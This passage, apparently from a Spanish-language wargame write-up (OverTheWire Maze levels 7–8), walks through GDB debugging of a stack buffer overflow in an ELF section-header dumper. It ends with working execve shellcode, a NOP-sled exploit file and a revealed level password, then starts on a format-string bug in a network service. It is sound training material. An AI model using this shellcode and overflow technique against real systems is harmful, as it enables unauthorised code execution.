  <span class=mtk1>__buf_00</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">size_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">int</span><span class=mtk1>)</span> <span class=mtk1>__buf</span> <span class=mtk5>+</span> <span class=mtk1>shstrndx</span> <span class=mtk5>*</span> <span class=mtk6>40</span> <span class=mtk5>+</span> <span class=mtk6>20</span><span class=mtk1>));</span>
  <span class=mtk8>read</span><span class=mtk1>(fd, __buf_00,</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">size_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">int</span><span class=mtk1>)</span> <span class=mtk1>__buf</span> <span class=mtk5>+</span> <span class=mtk1>shstrndx</span> <span class=mtk5>*</span> <span class=mtk6>40</span> <span class=mtk5>+</span> <span class=mtk6>20</span><span class=mtk1>));</span>
  <span class=mtk8>lseek</span><span class=mtk1>(fd,</span> <span class=mtk1>offset,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>No</span>  <span class=mtk4>Name</span><span class=mtk6>\t\t</span><span class=mtk4>Address</span><span class=mtk6>\t\t</span><span class=mtk4>Size"</span><span class=mtk1>);</span>
  <span class=mtk5>for</span> <span class=mtk1>(i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>i</span> <span class=mtk5>&lt;=</span> <span class=mtk1>num;</span> <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>read</span><span class=mtk1>(fd,</span> <span class=mtk1>sdata,</span> <span class=mtk1>size);</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%2d</span><span class=mtk4>:</span> <span class=mtk6>%-16s\t</span><span class=mtk4>0x</span><span class=mtk6>%08x\t</span><span class=mtk4>0x</span><span class=mtk6>%04x\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>i,</span> <span class=mtk1>(</span><span class="mtk7 mtki">int</span><span class=mtk1>)</span> <span class=mtk1>__buf_00</span> <span class=mtk5>+</span> <span class=mtk1>sdata._0_4_,</span> <span class=mtk1>sdata._12_4_,</span> <span class=mtk1>sdata._20_4_);</span>  
  <span class=mtk1>}</span>
  <span class=mtk8>putchar</span><span class=mtk1>(</span><span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>);</span>
  <span class=mtk8>free</span><span class=mtk1>(__buf_00);</span>
  <span class=mtk8>free</span><span class=mtk1>(__buf);</span>
  <span class=mtk5>return</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Esta vez, existe una vulnerabilidad de <em>Buffer Overflow</em> en <code>read(fd, sdata, size);</code> dentro de la función <code>Print_Shdrs</code>, ya que <code>sdata</code> tiene 40 bytes asignados y podemos controlar la variable <code>size</code>, que es el número de bytes que serán introducidos en <code>sdata</code>.</p><p>La variable <code>size</code> viene de <code>ehdr.e_shentsize</code> en la función <code>main</code>. Podemos controlar este campo con el archivo especificado. Vamos a probarlo con GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("".join(chr(c) * 4 for c in range(0x41, 0x5b)))'
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ  
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("".join(chr(c) * 4 for c in range(0x41, 0x5b)))' &lt; /tmp/file.txt
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file.txt
00000000: 4141 4141 4242 4242 4343 4343 4444 4444  AAAABBBBCCCCDDDD
00000010: 4545 4545 4646 4646 4747 4747 4848 4848  EEEEFFFFGGGGHHHH
00000020: 4949 4949 4a4a 4a4a 4b4b 4b4b 4c4c 4c4c  IIIIJJJJKKKKLLLL
00000030: 4d4d 4d4d 4e4e 4e4e 4f4f 4f4f 5050 5050  MMMMNNNNOOOOPPPP
00000040: 5151 5151 5252 5252 5353 5353 5454 5454  QQQQRRRRSSSSTTTT
00000050: 5555 5555 5656 5656 5757 5757 5858 5858  UUUUVVVVWWWWXXXX
00000060: 5959 5959 5a5a 5a5a 0a                   YYYYZZZZ.
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze7
Reading symbols from /maze/maze7...done.
(gdb) set pagination off
(gdb) disassemble main
Dump of assembler code for function main:
   0x080486d2 &lt;+0&gt;:     push   %ebp
   0x080486d3 &lt;+1&gt;:     mov    %esp,%ebp
   0x080486d5 &lt;+3&gt;:     push   %ebx
   0x080486d6 &lt;+4&gt;:     sub    $0x38,%esp
   0x080486d9 &lt;+7&gt;:     cmpl   $0x1,0x8(%ebp)
   0x080486dd &lt;+11&gt;:    jg     0x80486f9 &lt;main+39&gt;
   ...
   0x08048777 &lt;+165&gt;:   pushl  -0x8(%ebp)
   0x0804877a &lt;+168&gt;:   call   0x804859b &lt;Print_Shdrs&gt;
   0x0804877f &lt;+173&gt;:   add    $0x14,%esp
   0x08048782 &lt;+176&gt;:   pushl  -0x8(%ebp)
   0x08048785 &lt;+179&gt;:   call   0x8048480 &lt;close@plt&gt;
   0x0804878a &lt;+184&gt;:   add    $0x4,%esp
   0x0804878d &lt;+187&gt;:   mov    $0x0,%eax
   0x08048792 &lt;+192&gt;:   mov    -0x4(%ebp),%ebx
   0x08048795 &lt;+195&gt;:   leave
   0x08048796 &lt;+196&gt;:   ret
End of assembler dump.
</code></pre></div><p>Ponemos un <em>breakpoint</em> antes de llamar a <code>Print_Shdrs</code> y miramos los parámetros:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) break *0x0804877a
Breakpoint 1 at 0x804877a: file maze7.c, line 83.
(gdb) run /tmp/file.txt
Starting program: /maze/maze7 /tmp/file.txt
Dumping section-headers of program /tmp/file.txt

Breakpoint 1, 0x0804877a in main (argc=2, argv=0xffffd784) at maze7.c:83
83      maze7.c: No such file or directory.
(gdb) x/16x $esp
0xffffd698:     0x00000003      0x49494949      0x00004d4d      0x00004d4d  
0xffffd6a8:     0x00004c4c      0x41414141      0x42424242      0x43434343
0xffffd6b8:     0x44444444      0x45454545      0x46464646      0x47474747
0xffffd6c8:     0x48484848      0x49494949      0x4a4a4a4a      0x4b4b4b4b
</code></pre></div><p>Nos preocupa el quinto parámetro, que es <code>0x00004c4c</code> esta vez (donde tenemos <code>LLLL</code> en el archivo).</p><p>Ponemos otro <em>breakpoint</em> en la instrucción <code>read</code> vulnerable y vemos que alcanza el <em>breakpoint</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) disassemble Print_Shdrs
Dump of assembler code for function Print_Shdrs:
   0x0804859b &lt;+0&gt;:     push   %ebp
   0x0804859c &lt;+1&gt;:     mov    %esp,%ebp
   0x0804859e &lt;+3&gt;:     push   %ebx
   0x0804859f &lt;+4&gt;:     sub    $0x38,%esp
   0x080485a2 &lt;+7&gt;:     push   $0x0
   0x080485a4 &lt;+9&gt;:     pushl  0xc(%ebp)
   0x080485a7 &lt;+12&gt;:    pushl  0x8(%ebp)
   0x080485aa &lt;+15&gt;:    call   0x8048410 &lt;lseek@plt&gt;

   0x0804864e &lt;+179&gt;:   call   0x8048430 &lt;puts@plt&gt;
   0x08048653 &lt;+184&gt;:   add    $0x4,%esp
   0x08048656 &lt;+187&gt;:   movl   $0x0,-0x8(%ebp)
   0x0804865d &lt;+194&gt;:   jmp    0x80486a4 &lt;Print_Shdrs+265&gt;
   0x0804865f &lt;+196&gt;:   pushl  0x18(%ebp)
   0x08048662 &lt;+199&gt;:   lea    -0x3c(%ebp),%eax
   0x08048665 &lt;+202&gt;:   push   %eax
   0x08048666 &lt;+203&gt;:   pushl  0x8(%ebp)
   0x08048669 &lt;+206&gt;:   call   0x80483e0 &lt;read@plt&gt;
   0x0804866e &lt;+211&gt;:   add    $0xc,%esp
   0x08048671 &lt;+214&gt;:   lea    -0x3c(%ebp),%eax

   0x080486c4 &lt;+297&gt;:   call   0x8048400 &lt;free@plt&gt;
   0x080486c9 &lt;+302&gt;:   add    $0x4,%esp
   0x080486cc &lt;+305&gt;:   nop
   0x080486cd &lt;+306&gt;:   mov    -0x4(%ebp),%ebx
   0x080486d0 &lt;+309&gt;:   leave
   0x080486d1 &lt;+310&gt;:   ret
End of assembler dump.
(gdb) break *0x08048669
Breakpoint 2 at 0x8048669: file maze7.c, line 51.
(gdb) continue
Continuing.

No  Name                Address         Size

Breakpoint 2, 0x08048669 in Print_Shdrs (fd=3, offset=1229539657, shstrndx=19789, num=19789, size=19532) at maze7.c:51  
51      in maze7.c
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf7e87ce1 in ?? () from /lib32/libc.so.6
(gdb) quit
</code></pre></div><p>El programa se rompe porque debido a los argumentos que le pasamos a <code>Print_Shdrs</code>. Vamos a llenar el archivo con bytes nulos hasta la posición donde controlamos <code>size</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("\0" * 44 + "ABCD" + "\0" * 40)' &lt; /tmp/file.txt  
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file.txt
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 4142 4344  ............ABCD
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0a                   .........
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze7
Reading symbols from /maze/maze7...done.
(gdb) break *0x0804877a
Breakpoint 1 at 0x804877a: file maze7.c, line 83.
(gdb) run /tmp/file.txt
Starting program: /maze/maze7 /tmp/file.txt
Dumping section-headers of program /tmp/file.txt

Breakpoint 1, 0x0804877a in main (argc=2, argv=0xffffd784) at maze7.c:83
83      maze7.c: No such file or directory.
(gdb) x/16x $esp
0xffffd698:     0x00000003      0x00000000      0x00000000      0x00000000
0xffffd6a8:     0x00004443      0x00000000      0x00000000      0x00000000
0xffffd6b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6c8:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div><p>Sabemos que podemos controlar dos bytes (<code>0x00004443</code>, <code>CD</code>) que serán copiados a <code>size</code>. Ahora, vamos a añadir algo más reconocible después de <code>CD</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("\0" * 44 + "ABCD" + "".join(chr(c) * 4 for c in range(0x41, 0x46)))' &lt; /tmp/file.txt  
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file.txt
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 4142 4344  ............ABCD
00000030: 4141 4141 4242 4242 4343 4343 4444 4444  AAAABBBBCCCCDDDD
00000040: 4545 4545 0a                             EEEE.
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze7
Reading symbols from /maze/maze7...done.
(gdb) break *0x08048669
Breakpoint 1 at 0x8048669: file maze7.c, line 51.
(gdb) run /tmp/file.txt
Starting program: /maze/maze7 /tmp/file.txt
Dumping section-headers of program /tmp/file.txt

No  Name                Address         Size

Breakpoint 1, 0x08048669 in Print_Shdrs (fd=3, offset=0, shstrndx=16705, num=16705, size=17475) at maze7.c:51
51      maze7.c: No such file or directory.
(gdb) c
Continuing.
1111638594: (null)              0x00000000      0x0000


Program received signal SIGSEGV, Segmentation fault.
0xf7e84016 in free () from /lib32/libc.so.6
(gdb) info registers
eax            0x0      0
ecx            0x41414141       1094795585
edx            0x41414139       1094795577
ebx            0xf7fc5000       -134459392
esp            0xffffd640       0xffffd640
ebp            0xffffd690       0xffffd690
esi            0x2      2
edi            0xf7fc5000       -134459392
eip            0xf7e84016       0xf7e84016 &lt;free+38&gt;
eflags         0x10206  [ PF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) quit
</code></pre></div><p>Ahora que vuelve a romperse, vemos que <code>$ecx</code> tiene <code>0x41414141</code> (<code>AAAA</code>) como valor. Vamos a añadir más bytes nulos entre <code>ABCD</code> y <code>AAAA</code> y veamos qué pasa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("\0" * 44 + "ABCD" + "\0" * 4 + "".join(chr(c) * 4 for c in range(0x41, 0x45)))' &lt; /tmp/file.txt  
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file.txt
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 4142 4344  ............ABCD
00000030: 0000 0000 4141 4141 4242 4242 4343 4343  ....AAAABBBBCCCC
00000040: 4444 4444 0a                             DDDD.
<span class=code-green>maze7@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze7
Reading symbols from /maze/maze7...done.
(gdb) break *0x08048669
Breakpoint 1 at 0x8048669: file maze7.c, line 51.
(gdb) run /tmp/file.txt
Starting program: /maze/maze7 /tmp/file.txt
Dumping section-headers of program /tmp/file.txt

No  Name                Address         Size

Breakpoint 1, 0x08048669 in Print_Shdrs (fd=3, offset=0, shstrndx=0, num=0, size=17475) at maze7.c:51
51      maze7.c: No such file or directory.
(gdb) c
Continuing.
1094795585: (null)          0x00000000          0x0000


Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) quit
</code></pre></div><p>Genial, ahora tenemos el control de <code>$eip</code> (<code>0x44444444</code>, <code>DDDD</code>). Ahora, es el momento de ejecutar <em>shellcode</em>. La manera más sencilla es saltar a una variable de entorno cargada en la pila, como en niveles anteriores. Podemos utilizar el programa <code>envaddr</code> de antes para saber la dirección donde estará la variable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>maze7@maze:/tmp$ export TEST=$(python3 -c 'import os; os.write(1, b"\x90" * 200 + b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80")')  
maze7@maze:/tmp$ ./envaddr TEST /maze/maze7
TEST will be at 0xffffde0f
</code></pre></div><p>Ahora creamos el archivo (añadiendo algún offset a la dirección de la pila para caer en la zona de instrucciones <code>nop</code>) y listo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>maze7@maze:/tmp$ python3 -c 'import os; os.write(1, b"\0" * 44 + b"ABCD" + b"\0" * 16 + b"\x20\xde\xff\xff")' &gt; /tmp/file.txt  
maze7@maze:/tmp$ /maze/maze7 /tmp/file.txt
Dumping section-headers of program /tmp/file.txt

No  Name              Address       Size
 0: (null)            0x00000000    0x0000

$ whoami
maze8
$ cat /etc/maze_pass/maze8
pohninieng
</code></pre></div><h2 id=nivel-8---9>Nivel 8 -> 9</h2><p>Esta vez, el binario <code>/maze/maze8</code> ejecutará un programa que escucha en un puerto dado (1337 por defecto) y espera una contraseña:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar2;</span>
  <span class="mtk7 mtki">__pid_t</span> <span class=mtk1>_Var3;</span>
  <span class="mtk7 mtki">size_t</span> <span class=mtk1>sVar4;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class=mtk1>sVar5;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>replybuf[</span><span class=mtk6>532</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>buf[</span><span class=mtk6>512</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>sopt;</span>
  <span class=mtk1>sockaddr_in</span> <span class=mtk1>serv;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>bytes;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>client_sock;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>serv_sock;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>answer;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>question;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>port;</span>

  <span class=mtk1>answer</span> <span class=mtk5>=</span> <span class=mtk4>"god"</span><span class=mtk1>;</span>
  <span class=mtk1>port._0_2_</span> <span class=mtk5>=</span> <span class=mtk6>1337</span><span class=mtk1>;</span>
  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>atoi</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>]);</span>
    <span class=mtk1>port._0_2_</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint16_t</span><span class=mtk1>)</span> <span class=mtk1>iVar1;</span>
  <span class=mtk1>}</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>socket</span><span class=mtk1>(</span><span class=mtk6>2</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>6</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>perror</span><span class=mtk1>(</span><span class=mtk4>"socket()"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>setsockopt</span><span class=mtk1>(iVar1,</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>sopt,</span> <span class=mtk6>4</span><span class=mtk1>);</span>
  <span class=mtk1>serv.sin_family</span> <span class=mtk5>=</span> <span class=mtk6>2</span><span class=mtk1>;</span>
  <span class=mtk1>serv.sin_port</span> <span class=mtk5>=</span> <span class=mtk8>htons</span><span class=mtk1>((</span><span class="mtk7 mtki">uint16_t</span><span class=mtk1>)</span> <span class=mtk1>port);</span>
  <span class=mtk1>serv.sin_addr</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk8>memset</span><span class=mtk1>(serv.sin_zero,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>8</span><span class=mtk1>);</span>
  <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk8>bind</span><span class=mtk1>(iVar1,</span> <span class=mtk1>(sockaddr</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span><span class=mtk1>serv,</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar2</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>perror</span><span class=mtk1>(</span><span class=mtk4>"bind()"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk8>listen</span><span class=mtk1>(iVar1,</span> <span class=mtk6>5</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar2</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>perror</span><span class=mtk1>(</span><span class=mtk4>"listen()"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>alarm</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>4b0</span><span class=mtk1>);</span>
  <span class=mtk8>signal</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>e</span><span class=mtk1>,</span> <span class=mtk1>alrm);</span>
  <span class=mtk8>signal</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>11</span><span class=mtk1>,</span> <span class=mtk1>(</span><span class="mtk7 mtki">__sighandler_t</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk5>while</span><span class=mtk1>(</span> <span class=mtk6>true</span> <span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>client_sock</span> <span class=mtk5>=</span> <span class=mtk8>accept</span><span class=mtk1>(iVar1,</span> <span class=mtk1>(sockaddr</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk1>(</span><span class="mtk7 mtki">socklen_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
    <span class=mtk1>_Var3</span> <span class=mtk5>=</span> <span class=mtk8>fork</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(_Var3</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk8>close</span><span class=mtk1>(client_sock);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>sVar4</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(</span><span class=mtk4>"Give</span> <span class=mtk4>the</span> <span class=mtk4>correct</span> <span class=mtk4>password</span> <span class=mtk4>to</span> <span class=mtk4>proceed:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>send</span><span class=mtk1>(client_sock,</span> <span class=mtk4>"Give</span> <span class=mtk4>the</span> <span class=mtk4>correct</span> <span class=mtk4>password</span> <span class=mtk4>to</span> <span class=mtk4>proceed:</span> <span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>sVar4,</span> <span class=mtk6>0</span><span class=mtk1>);</span>  
  <span class=mtk1>sVar5</span> <span class=mtk5>=</span> <span class=mtk8>recv</span><span class=mtk1>(client_sock,buf,</span> <span class=mtk5>0x</span><span class=mtk6>1ff</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk1>buf[sVar5]</span> <span class=mtk5>=</span> <span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>;</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>strcmp</span><span class=mtk1>(answer,</span> <span class=mtk1>buf);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>replybuf._0_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>2e727245</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._4_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>49202e2e</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._8_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>73617720</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._12_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>73756a20</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._16_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>6f6a2074</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._20_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>676e696b</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._24_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>202e2e2e</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._28_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>2c736579</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._32_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>206f6720</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._36_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>79617761</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf._40_2_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>a2e</span><span class=mtk1>;</span>
    <span class=mtk1>replybuf[</span><span class=mtk6>42</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk5>else</span> <span class=mtk1>{</span>
    <span class=mtk8>snprintf</span><span class=mtk1>(replybuf,</span> <span class=mtk5>0x</span><span class=mtk6>200</span><span class=mtk1>,</span> <span class=mtk1>buf);</span>
    <span class=mtk1>sVar4</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(replybuf);</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined4</span> <span class=mtk5>*</span><span class=mtk1>)(replybuf</span> <span class=mtk5>+</span> <span class=mtk1>(sVar4</span> <span class=mtk5>-</span> <span class=mtk6>1</span><span class=mtk1>))</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>20736920</span><span class=mtk1>;</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined4</span> <span class=mtk5>*</span><span class=mtk1>)(replybuf</span> <span class=mtk5>+</span> <span class=mtk1>sVar4</span> <span class=mtk5>+</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>6e6f7277</span><span class=mtk1>;</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined4</span> <span class=mtk5>*</span><span class=mtk1>)(replybuf</span> <span class=mtk5>+</span> <span class=mtk1>sVar4</span> <span class=mtk5>+</span> <span class=mtk6>7</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>5f5e2067</span><span class=mtk1>;</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined2</span> <span class=mtk5>*</span><span class=mtk1>)(replybuf</span> <span class=mtk5>+</span> <span class=mtk1>sVar4</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>b</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>a5e</span><span class=mtk1>;</span>
